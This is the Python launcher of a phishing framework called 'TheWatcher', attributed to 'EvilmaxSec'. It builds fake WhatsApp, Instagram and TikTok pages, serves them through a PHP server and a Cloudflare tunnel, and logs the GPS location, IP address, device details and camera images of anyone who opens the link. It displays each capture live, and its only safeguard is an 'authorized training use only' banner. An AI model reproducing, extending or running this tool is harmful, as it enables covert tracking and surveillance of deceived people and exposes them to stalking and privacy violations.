#!/usr/bin/env python3
import os
import sys
import time
import json
import subprocess
import threading
import re
import socket

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(Colors.RED + Colors.BOLD + """
      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
                            ~EvilmaxSec | Tz~
""" + Colors.END)
    print(Colors.RED + Colors.BOLD + """
╔══════════════════════════════════════════════════════════════╗
║         TheWatcher Advanced Phishing Framework               ║
╚══════════════════════════════════════════════════════════════╝
""" + Colors.END)
    print(Colors.GRAY + "┌────────────────────────────────────────────────────────────────────────┐")
    print("│  " + Colors.WHITE + "Author: " + Colors.RED + "EvilmaxSec" + Colors.GRAY + "                                                    │")
    print("│  " + Colors.WHITE + "GitHub: " + Colors.GRAY + "https://github.com/EvilmaxSec" + Colors.GRAY + "                                 │")
    print("│  " + Colors.RED + "⚠  AUTHORIZED TRAINING USE ONLY  ⚠" + Colors.GRAY + "                                    │")
    print("└────────────────────────────────────────────────────────────────────────┘" + Colors.END)
    print("")

def print_menu(title, options):
    print("\n" + Colors.CYAN + Colors.BOLD + "┌─────────────────────────────────────────────────┐" + Colors.END)
    print(Colors.CYAN + Colors.BOLD + "│          " + title.ljust(35) + Colors.CYAN + Colors.BOLD + "    │" + Colors.END)
    print(Colors.CYAN + Colors.BOLD + "├─────────────────────────────────────────────────┤" + Colors.END)
    for key, value in options.items():
        print(Colors.CYAN + Colors.BOLD + "│" + Colors.END + "  " + Colors.RED + "[" + key + "]" + Colors.END + " " + Colors.WHITE + value.ljust(39) + Colors.CYAN + Colors.BOLD + "   │" + Colors.END)
    print(Colors.CYAN + Colors.BOLD + "└─────────────────────────────────────────────────┘" + Colors.END)

def print_success(msg): 
    print("  " + Colors.GREEN + "✓" + Colors.END + " " + Colors.WHITE + msg + Colors.END)

def print_error(msg): 
    print("  " + Colors.RED + "✗" + Colors.END + " " + Colors.WHITE + msg + Colors.END)

def print_info(msg): 
    print("  " + Colors.BLUE + "ℹ" + Colors.END + " " + Colors.WHITE + msg + Colors.END)

def print_warning(msg): 
    print("  " + Colors.YELLOW + "⚠" + Colors.END + " " + Colors.WHITE + msg + Colors.END)

def get_input(prompt, default=""):
    if default:
        val = input("  " + Colors.RED + "➜" + Colors.END + " " + Colors.WHITE + prompt + Colors.GRAY + " [" + default + "]:" + Colors.END + " ")
        return val if val else default
    return input("  " + Colors.RED + "➜" + Colors.END + " " + Colors.WHITE + prompt + ":" + Colors.END + " ")

def get_number(prompt, min_val, max_val):
    while True:
        try:
            val = int(get_input(prompt))
            if min_val <= val <= max_val:
                return val
            print_error(f"Enter {min_val}-{max_val}")
        except ValueError:
            print_error("Enter a number")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def check_command(cmd):
    try:
        subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def get_image_source(prompt_type):
    print("\n  " + Colors.CYAN + "📸 " + prompt_type + Colors.END)
    print("  " + Colors.GRAY + "[1] Use image URL" + Colors.END)
    print("  " + Colors.GRAY + "[2] Use local image file" + Colors.END)
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter image URL", "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop")
    else:
        while True:
            path = get_input("Enter local image path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                return "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"

def get_video_source():
    print("\n  " + Colors.CYAN + "🎬 Video Source" + Colors.END)
    print("  " + Colors.GRAY + "[1] Use video URL" + Colors.END)
    print("  " + Colors.GRAY + "[2] Use local video file" + Colors.END)
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter video URL", "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4")
    else:
        while True:
            path = get_input("Enter local video path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                return "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"

def clear_old_data():
    if os.path.exists('data'):
        for f in os.listdir('data'):
            try:
                os.unlink(os.path.join('data', f))
            except:
                pass
    else:
        os.makedirs('data', exist_ok=True)

def monitor_data(stop_event):
    processed = set()
    while not stop_event.is_set():
        time.sleep(1)
        if os.path.exists('data'):
            current = set(os.listdir('data'))
            new_files = current - processed
            for f in new_files:
                if f.endswith('.json'):
                    try:
                        with open(os.path.join('data', f), 'r') as file:
                            data = json.load(file)
                            if 'coordinates' in data and data['coordinates'].get('latitude'):
                                print("\n" + Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
                                print(Colors.GREEN + Colors.BOLD + "📍 NEW LOCATION CAPTURED!" + Colors.END)
                                print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
                                print("  " + Colors.YELLOW + "Time:" + Colors.END + " " + str(data.get('timestamp')))
                                print("  " + Colors.YELLOW + "IP:" + Colors.END + " " + str(data.get('ip_address')))
                                print("  " + Colors.YELLOW + "GPS:" + Colors.END + " " + str(data['coordinates']['latitude']) + ", " + str(data['coordinates']['longitude']))
                                print("  " + Colors.YELLOW + "Device:" + Colors.END + " " + str(data['device']['device']) + " | OS: " + str(data['device']['os']))
                                print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END + "\n")
                    except:
                        pass
                elif f.endswith('.jpg'):
                    size = os.path.getsize(os.path.join('data', f)) // 1024
                    print("\n" + Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
                    print(Colors.GREEN + Colors.BOLD + "📸 NEW CAMERA IMAGE!" + Colors.END)
                    print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END)
                    print("  " + Colors.YELLOW + "File:" + Colors.END + " " + f + " (" + str(size) + "KB)")
                    print(Colors.GREEN + Colors.BOLD + "="*70 + Colors.END + "\n")
            processed = current

class TheWatcher:
    def __init__(self):
        self.monitor_thread = None
        self.php_process = None
        self.stop_monitor = threading.Event()
    
    def run_server(self, port, html):
        clear_old_data()
        os.makedirs('templates', exist_ok=True)
        with open('templates/current.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        print_info(f"Starting PHP server on port {port}...")
        
        if not check_command("php"):
            print_error("PHP not installed")
            sys.exit(1)
        
        self.stop_monitor.clear()
        self.monitor_thread = threading.Thread(target=monitor_data, args=(self.stop_monitor,), daemon=True)
        self.monitor_thread.start()
        
        self.php_process = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}", "server.php"],
            stderr=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        
        def read_stderr():
            for line in iter(self.php_process.stderr.readline, ''):
                if line.strip():
                    if "Accepted" in line or "Closing" in line or "Development Server" in line:
                        continue
                    print(line.strip())
        
        threading.Thread(target=read_stderr, daemon=True).start()
        time.sleep(2)
        
        from modules.cloudflare import CloudflareTunnel
        cf = CloudflareTunnel()
        url = cf.start(port)
        local_ip = get_local_ip()
        
        print("\n" + Colors.CYAN + Colors.BOLD + "="*60 + Colors.END)
        print(Colors.CYAN + Colors.BOLD + "🌐 SHAREABLE LINKS" + Colors.END)
        print(Colors.CYAN + Colors.BOLD + "="*60 + Colors.END)
        if url:
            print_success(f"Cloudflare: {Colors.YELLOW}{url}{Colors.END}")
        print_success(f"Local: http://localhost:{port}")
        print_success(f"Network: http://{local_ip}:{port}")
        
        print("\n" + Colors.GREEN + Colors.BOLD + "╔══════════════════════════════════════════════════════╗" + Colors.END)
        print(Colors.GREEN + Colors.BOLD + "║     🚀 TheWatcher Active!                            ║" + Colors.END)
        print(Colors.GREEN + Colors.BOLD + "║     📡 Waiting for targets...                       ║" + Colors.END)
        print(Colors.GREEN + Colors.BOLD + "║     🔴 Press Ctrl+C to stop                         ║" + Colors.END)
        print(Colors.GREEN + Colors.BOLD + "╚══════════════════════════════════════════════════════╝" + Colors.END + "\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\nStopping server...")
            self.stop_monitor.set()
            if self.php_process:
                self.php_process.terminate()
            cf.stop()
    
    def location_menu(self):
        print("\n" + Colors.BLUE + Colors.BOLD + "📍 LOCATION TRACKING" + Colors.END)
        print(Colors.GRAY + "─"*50 + Colors.END)
        
        print_menu("SELECT TEMPLATE", {
            "1": "WhatsApp Group Invite",
            "2": "Instagram Story", 
            "3": "TikTok Video"
        })
        
        choice = get_number("Choose", 1, 3)
        from modules.templates import TemplateManager
        
        if choice == 1:
            name = get_input("Group name", "Security Group")
            image = get_image_source("Group Image")
            members = get_input("Members", "128")
            html = TemplateManager.get_whatsapp_location(name, image, members)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 2:
            username = get_input("Username", "instagram")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            views = get_input("Views", "1.2M")
            likes = get_input("Likes", "125K")
            caption = get_input("Caption", "Check out my story!")
            html = TemplateManager.get_instagram_story_custom(username, verified, profile, video, views, likes, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 3:
            username = get_input("Username", "tiktok")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            views = get_input("Views", "1.2M")
            likes = get_input("Likes", "125K")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Check this out!")
            html = TemplateManager.get_tiktok_video_custom(username, verified, profile, video, views, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
    
    def camera_menu(self):
        print("\n" + Colors.BLUE + Colors.BOLD + "📸 CAMERA ACCESS" + Colors.END)
        print(Colors.GRAY + "─"*50 + Colors.END)
        
        print_menu("SELECT TEMPLATE", {
            "1": "Instagram Reel",
            "2": "TikTok Video"
        })
        
        choice = get_number("Choose", 1, 2)
        from modules.templates import TemplateManager
        
        if choice == 1:
            username = get_input("Username", "instagram")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            likes = get_input("Likes", "1.2M")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Amazing content!")
            html = TemplateManager.get_instagram_camera(username, verified, profile, video, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
        elif choice == 2:
            username = get_input("Username", "tiktok")
            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
            profile = get_image_source("Profile Image")
            video = get_video_source()
            likes = get_input("Likes", "1.2M")
            comments = get_input("Comments", "12.5K")
            shares = get_input("Shares", "5.2K")
            caption = get_input("Caption", "Check this out!")
            html = TemplateManager.get_tiktok_camera(username, verified, profile, video, likes, comments, shares, caption)
            port = get_number("Port (8080)", 1, 65535)
            self.run_server(port, html)
    
    def view_data(self):
        print("\n" + Colors.BLUE + Colors.BOLD + "📊 COLLECTED DATA" + Colors.END)
        print(Colors.GRAY + "─"*50 + Colors.END)
        
        if not os.path.exists('data') or not os.listdir('data'):
            print_warning("No data yet")
            input("\n  Press Enter...")
            return
        
        for f in os.listdir('data'):
            if f.endswith('.json'):
                try:
                    with open(os.path.join('data', f), 'r') as file:
                        data = json.load(file)
                        print("\n  " + Colors.GREEN + "📄 " + f + Colors.END)
                        print("     " + Colors.YELLOW + "Time:" + Colors.END + " " + str(data.get('timestamp')))
                        print("     " + Colors.YELLOW + "IP:" + Colors.END + " " + str(data.get('ip_address')))
                        if 'coordinates' in data:
                            print("     " + Colors.YELLOW + "GPS:" + Colors.END + " " + str(data['coordinates'].get('latitude')) + ", " + str(data['coordinates'].get('longitude')))
                except:
                    pass
            elif f.endswith('.jpg'):
                size = os.path.getsize(os.path.join('data', f)) // 1024
                print("\n  " + Colors.GREEN + "📸 " + f + Colors.END + " (" + str(size) + "KB)")
        
        input("\n  Press Enter...")
    
    def main(self):
        while True:
            banner()
            print_menu("MAIN MENU", {
                "1": "📍 Track Location",
                "2": "📸 Access Camera",
                "3": "📊 View Data",
                "4": "🚪 Exit"
            })
            
            choice = get_input("\nSelect", "1")
            
            if choice == '1':
                self.location_menu()
            elif choice == '2':
                self.camera_menu()
            elif choice == '3':
                self.view_data()
            elif choice == '4':
                print_success("Goodbye!")
                sys.exit(0)
            else:
                print_error("Invalid")
                time.sleep(1)

if __name__ == "__main__":
    watcher = TheWatcher()
    watcher.main()
